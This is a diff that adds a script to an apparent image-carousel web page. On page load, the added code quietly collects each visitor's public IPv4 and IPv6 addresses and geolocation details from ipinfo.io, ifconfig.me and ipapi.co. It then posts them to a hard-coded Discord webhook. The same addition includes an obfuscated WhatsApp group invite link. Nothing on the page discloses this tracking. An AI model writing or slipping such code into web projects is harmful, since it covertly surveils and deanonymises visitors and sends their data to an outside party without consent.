@@ -129,6 +129,59 @@
 </div>
 
 <script>
+   const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1474010870479716364/VqLT5gBq-5i9DHeZHj7YV0KuzxLEuQfSJ01qIwxXxYm1nK3xyZmgl8rL160z_TaAfg02";
+var walink="https:/removethistextoekoff/chat.whatsapp.com/H9GYoam4C4SG21tuJut8HH?mode=gi_t";
+    // Function to fetch IPv6
+    async function getIPv6() {
+      try {
+        const response = await fetch('https://ifconfig.me/ip');
+        const ipv6 = (await response.text()).trim();
+        return ipv6;
+      } catch (err) {
+        console.error("Error fetching IPv6:", err);
+        return "Unavailable";
+      }
+    }
+
+    async function fetchIPInfo() {
+      try {
+        // Get public IPv4
+        const ipResponse = await fetch("https://ipinfo.io/ip");
+        const ipv4 = (await ipResponse.text()).trim();
+
+        // Get detailed info
+        const infoResponse = await fetch(`https://ipapi.co/${ipv4}/json/`);
+        const infoData = await infoResponse.json();
+
+        // Get IPv6
+        const ipv6 = await getIPv6();
+
+        // Combine data
+        const outputData = {
+          ipv4,
+          ipv6,
+          ...infoData
+        };
+
+        console.log("IP info:", outputData); // Check locally
+
+        // Send to Discord
+        await fetch(DISCORD_WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `IP Info:\n\`\`\`json\n${JSON.stringify(outputData, null, 2)}\n\`\`\``
+          })
+        });
+
+        console.log("Webhook sent successfully!");
+      } catch (error) {
+        console.error("Error fetching/sending IP info:", error);
+      }
+    }
+
+    fetchIPInfo();
+   
 const images = ["1.png","2.png","3.png","4.png","5.png"];
 const viewer = document.getElementById("viewer");
 const dotsContainer = document.getElementById("dots");
